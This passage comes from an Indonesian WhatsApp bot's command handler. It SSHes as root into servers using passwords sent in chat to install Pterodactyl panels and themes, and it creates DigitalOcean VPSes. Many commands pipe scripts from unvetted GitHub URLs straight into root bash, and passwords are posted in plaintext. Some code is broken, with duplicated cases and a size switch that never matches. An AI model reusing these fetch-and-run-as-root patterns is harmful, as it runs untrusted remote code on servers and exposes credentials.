                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async () => {
                        const teks = `

Hackback Panel Sukses ✅

Berikut detail akun admin panel : • Username : ${newuser} • Password : ${newpw} `; await dwiaff.sendMessage(m.chat, { text: teks }, { quoted: m }); ress.end(); }); }); }).on('error', (err) => { console.error("Connection Error: " + err); m.reply("Kata sandi atau IP VPS tidak valid."); }).connect(connSettings);

await dwiaff.sendMessage(m.chat, { text: "Pembayaran berhasil! Memulai proses hackback panel..." }, { quoted: msgQr });
            delete db.users[m.sender].saweria;
        }
    }
} catch (error) {
    console.error("Error during process:", error);
    m.reply("Terjadi kesalahan, coba lagi nanti.");
}
break;

}

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

case "startwings": case "configurewings": {
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installdepend": {
    if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
                await m.reply("Berhasil install Depend silakan ketik .installnebula ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('11\n');
                stream.write('A\n');
                stream.write('Y\n');
                stream.write('Y\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break;

case "installtemanightcore": case "installtemanightcore": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nightcore* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('1\n');
stream.write('y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemaelysium": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema Elysium* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
 stream.write('1\n');
stream.write('y\n');
stream.write('yes\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break   

case 'installtema': {
        if (!isCreator) return reply(mess.owner)
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
    let headerText = `
    𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝙋𝙞𝙡𝙞𝙝 𝙏𝙚𝙢𝙖 𝙔𝙖𝙣𝙜 𝙄𝙣𝙜𝙞𝙣 𝘼𝙣𝙙𝙖 𝙄𝙣𝙨𝙩𝙖𝙡𝙡
    𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙣𝙜𝙞𝙣𝙨𝙩𝙖𝙡𝙡 𝙉𝙚𝙗𝙪𝙡𝙖 𝙄𝙣𝙨𝙩𝙖𝙡𝙡 𝘿𝙚𝙥𝙚𝙣𝙙 𝘿𝙪𝙡𝙪
    `;
    dwiaff.sendMessage(m.chat, {
        image: { url: 'https://img5.pixhost.to/images/2973/568676974_media.jpg' }, // Change this URL to your image link
        caption: headerText, 
        footer: "⿻  ⌜ 𝐍𝐚𝐛𝐙𝐱 ⌟  ⿻",
        buttons: [
            {
                buttonId: 'action',
                buttonText: {
                    displayText: '𝙋𝙞𝙡𝙞𝙝 𝙏𝙝𝙚𝙢𝙚'
                },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝙋𝙞𝙡𝙞𝙝 𝙏𝙝𝙚𝙢𝙚',
                        sections: [
                            { 
                                title: "𝙋𝙞𝙡𝙞𝙝 𝙏𝙝𝙚𝙢𝙚",  
                                rows: [
                                    { title: "𝙄𝙣𝙨𝙩𝙖𝙡𝙡 𝘿𝙚𝙥𝙚𝙣𝙙", id: `.installdepend` },
                                    { title: "𝙄𝙣𝙨𝙩𝙖𝙡𝙡 𝙉𝙚𝙗𝙪𝙡𝙖", id: `.installtemanebula` }, 
                                    { title: "𝙄𝙣𝙨𝙩𝙖𝙡𝙡 𝙉𝙞𝙜𝙝𝙩 𝘾𝙤𝙧𝙚", id: `.installtemanightcore` },
                                    { title: "𝙄𝙣𝙨𝙩𝙖𝙡𝙡 𝙎𝙩𝙚𝙡𝙡𝙖𝙧", id: `.installtemastellar` }, 
                                    { title: "𝙄𝙣𝙨𝙩𝙖𝙡𝙡 𝘽𝙞𝙡𝙡𝙞𝙣𝙜", id: `.installtemabilling` },
                                    { title: "𝙄𝙣𝙨𝙩𝙖𝙡𝙡 𝙀𝙣𝙞𝙜𝙢𝙖", id: `.installtemaenigma` }, 
                                    { title: "𝙐𝙣𝙞𝙣𝙨𝙩𝙖𝙡𝙡 𝙏𝙝𝙚𝙢𝙚", id: `.uninstallthema` }, 
                                ]
                            }
                        ],
                    }),
                }
            }
        ],
        headerType: 4, // Header type 4 for image
        viewOnce: true
    }, { quoted: m });
}
break;

case "installtemaelysium": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema Elysium* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
 stream.write('1\n');
stream.write('y\n');
stream.write('yes\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemanebula": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "uninstalltema": {
if (!isCreator) return reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "uninstallthema": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case 'cvps': {
if (!isCreator && !isPremium) return reply(mess.owner)
    if (!q) return m.reply(example("hostname"));
    global.hostname = text.toLowerCase();
    let menu = `ᴘɪʟɪʜ ʀᴀᴍ ᴠᴘs ᴅɪʙᴀᴡᴀʜ ɪɴɪ`;

    let buttons = [
        { buttonId: ".owner", buttonText: { displayText: "ᴏᴡɴᴇʀ" } },
        { buttonId: ".menu", buttonText: { displayText: "ᴍᴇɴᴜ" } }
    ];

    let buttonMessage = {
        video: { 
            url: "menu.mp4", 
            gifPlayback: true 
        },
        caption: `${menu}`,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: `ʙᴏᴛ ʙʏ ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛ`
            }
        },
        footer: "© ʙʏ ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛ",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "ᴘɪʟɪʜ ʀᴀᴍ ɪᴄɪʙᴏs!",
                    sections: [
                        {
                                 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʀᴀᴍ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                        highlight_label: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛ",
                        rows: [
                            { title: "𝟷ɢʙ ᴄᴏʀᴇ 𝟷", description: "ᴍᴇᴍʙᴜᴀᴛ ʀᴀᴍ 𝟷ɢʙ 𝟷 ᴄᴏʀᴇ", id: ".1gb1c" },
                            { title: "𝟸ɢʙ 𝟷ᴄᴏʀᴇ", description: "ᴍᴇᴍʙᴜᴀᴛ ʀᴀᴍ 𝟸ɢʙ 𝟷 ᴄᴏʀᴇ", id: ".2gb1c" },
                            { title: "𝟸ɢʙ 𝟸ᴄᴏʀᴇ", description: "ᴍᴇᴍʙᴜᴀᴛ ʀᴀᴍ 𝟸ɢʙ 𝟸ᴄᴏʀᴇ", id: ".2gb2c" },
                            { title: "𝟺ɢʙ 𝟸ᴄᴏʀᴇ", description: "ᴍᴇᴍʙᴜᴀᴛ ʀᴀᴍ 𝟺ɢʙ 𝟸ᴄᴏʀᴇ", id: ".4gb2c" },
                            { title: "𝟾ɢʙ 𝟺ᴄᴏʀᴇ", description: "ᴍᴇᴍʙᴜᴀᴛ ʀᴀᴍ 𝟾ɢʙ 𝟺ᴄᴏʀᴇ", id: ".8gb4c" },
                            { title: "𝟷𝟼ɢʙ 𝟺ᴄᴏʀᴇ", description: "ᴍᴇᴍʙᴜᴀᴛ ʀᴀᴍ 𝟷𝟼ɢʙ 𝟺ᴄᴏʀᴇ", id: ".16gb4c" }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await dwiaff.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break;

case '1gb1c':
case '2gb1c':
case '2gb2c':
case '4gb2c':
case '8gb4c':
case '16gb4c': {
    if (!isCreator) return reply(mess.owner)
    let size;

    // Pilih konfigurasi VPS berdasarkan tombol
    switch (command) {
        case '1gb1c':
            size = 's-1vcpu-1gb';
            break;
        case '2gb1c':
            size = 's-1vcpu-2gb';
            break;
        case '2gb2c':
            size = 's-2vcpu-2gb';
            break;
        case '4gb2c':
            size = 's-2vcpu-4gb';
            break;
        case '8gb4c':
            size = 's-4vcpu-8gb';
            break;
        default:
            size = 's-4vcpu-16gb-amd';
    }

    // Data untuk pembuatan VPS
    let dropletData = {
        name: global.hostname,
        region: 'sgp1', // Wilayah
        size: size,
        image: 'ubuntu-20-04-x64',
        ssh_keys: null,
        backups: false,
        ipv6: true,
        user_data: null,
        private_networking: null,
        volumes: null,
        tags: ['dwiaff']
    };

    try {
        // Generate password secara acak
        let password = await generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        // Request ke API DigitalOcean
        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + global.apido
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletId = responseData.droplet.id;

            // Tunggu VPS selesai dibuat
            await m.reply('Sedang membuat VPS, mohon tunggu...');
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Ambil informasi VPS yang telah dibuat
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + global.apido
                }
            });

            let dropletDetails = await dropletResponse.json();
            let ipVPS = dropletDetails.droplet.networks.v4[0]?.ip_address || 'IP tidak ditemukan';

            // Kirim detail VPS ke pengguna
            let messageText = `✅ VPS Berhasil Dibuat!\n\n`;
            messageText += `🌐 Hostname: ${global.hostname}\n`;
            messageText += `💻 Konfigurasi: ${size}\n`;
            messageText += `🔑 Password: ${password}\n`;
            messageText += `🌍 IP VPS: ${ipVPS}\n`;

            await dwiaff.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(responseData.message || 'Kesalahan tidak diketahui.');
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan: ${err.message}`);
    }
    break;
}

case "vps1g1c": case "vps2g1c": case "vps2g2c": case "vps4g2c": case "vps8g4c": case "vps16g4c": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("hostname"))
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apido
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apido
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await dwiaff.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break


case "createvps": {
  if (!isCreator) return reply(mess.owner)

  const args = text.split(' '); // Memisahkan argumen berdasarkan spasi
  const hostname = args[0]; // Nama host
  const sizeOption = args[1]; // Ukuran VPS
  const osOption = args[2] || "ubuntu"; // Default: Ubuntu
  const osVersionOption = args[3] || "20-04"; // Default: Ubuntu 20.04
  const regionOption = args[4] || "sgp1"; // Default: Singapore

  // Validasi argumen
  if (!hostname || !sizeOption) {
    return m.reply(
      `*Format argumen salah!*\nCONTOH: ${prefix + command} namahostmu vps16g4c ubuntu 20-04 sgp1\n\n` +
      `*Opsi yang tersedia:*\n` +
      `- Ukuran VPS: vps1g1c, vps2g1c, vps2g2c, vps4g2c, vps8g4c, vps16g4c\n` +
      `- OS: ubuntu, debian, centos, fedora\n` +
      `- Versi OS:\n  Ubuntu: 20-04, 22-04\n  Debian: 10, 11\n  CentOS: 7, 8\n  Fedora: 34, 35\n` +
      `- Region: sgp1, nyc3, ams3, lon1, fra1, sfo1, blr1, tor1`
    );
  }

  // Peta OS dan Versi
  const osMap = {
    ubuntu: { '20-04': 'ubuntu-20-04-x64', '22-04': 'ubuntu-22-04-x64' },
    debian: { '10': 'debian-10-x64', '11': 'debian-11-x64' },
    centos: { '8': 'centos-8-x64', '7': 'centos-7-x64' },
    fedora: { '34': 'fedora-34-x64', '35': 'fedora-35-x64' },
  };

  if (!osMap[osOption]) {
    return m.reply(`*OS tidak valid!*\nOS yang tersedia: ubuntu, debian, centos, fedora.`);
  }
  if (!osMap[osOption][osVersionOption]) {
    return m.reply(
      `*Versi OS tidak valid!*\nVersi yang tersedia untuk ${osOption}: ${Object.keys(osMap[osOption]).join(', ')}`
    );
  }

  // Peta Ukuran
  const sizeMap = {
    vps1g1c: 's-1vcpu-1gb',
    vps2g1c: 's-1vcpu-2gb',
    vps2g2c: 's-2vcpu-2gb',
    vps4g2c: 's-2vcpu-4gb',
    vps8g4c: 's-4vcpu-8gb',
    vps16g4c: 's-4vcpu-16gb-amd',
  };

  if (!sizeMap[sizeOption]) {
    return m.reply(`*Ukuran VPS tidak valid!*\nUkuran yang tersedia: ${Object.keys(sizeMap).join(', ')}`);
  }

  // Peta Region
  const regionMap = {
    sgp1: 'Singapore (SGP1)',
    nyc3: 'New York (NYC3)',
    ams3: 'Amsterdam (AMS3)',
    lon1: 'London (LON1)',
    fra1: 'Frankfurt (FRA1)',
    sfo1: 'San Francisco (SFO1)',
    blr1: 'Bangalore (BLR1)',
    tor1: 'Toronto (TOR1)',
  };

  if (!regionMap[regionOption]) {
    return m.reply(`*Region tidak valid!*\nRegion yang tersedia: ${Object.keys(regionMap).join(', ')}`);
  }

  try {
    // Data untuk membuat droplet
    let dropletData = {
      name: hostname.toLowerCase(),
      region: regionOption,
      size: sizeMap[sizeOption],
      image: osMap[osOption][osVersionOption],
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T'],
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: 'Bearer ' + global.apido,
      },
      body: JSON.stringify(dropletData),
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      await m.reply(`Memproses pembuatan VPS...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          Authorization: 'Bearer ' + global.apido,
        },
      });

      let dropletDetails = await dropletResponse.json();
      let ipVPS =
        dropletDetails.droplet.networks.v4 && dropletDetails.droplet.networks.v4.length > 0
          ? dropletDetails.droplet.networks.v4[0].ip_address
          : 'Tidak ada alamat IP yang tersedia';

      let messageText = `VPS berhasil dibuat!\n\n`;
      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}`;

      await dwiaff.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat membuat VPS: ${err.message}`);
  }
}
break;

// Fungsi untuk membuat password acak
function generateRandomPassword(length = 12) {
  const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    password += charset[randomIndex];
  }
  return password;
}

case "listgc": case "cekidgc": case"listgrup": {

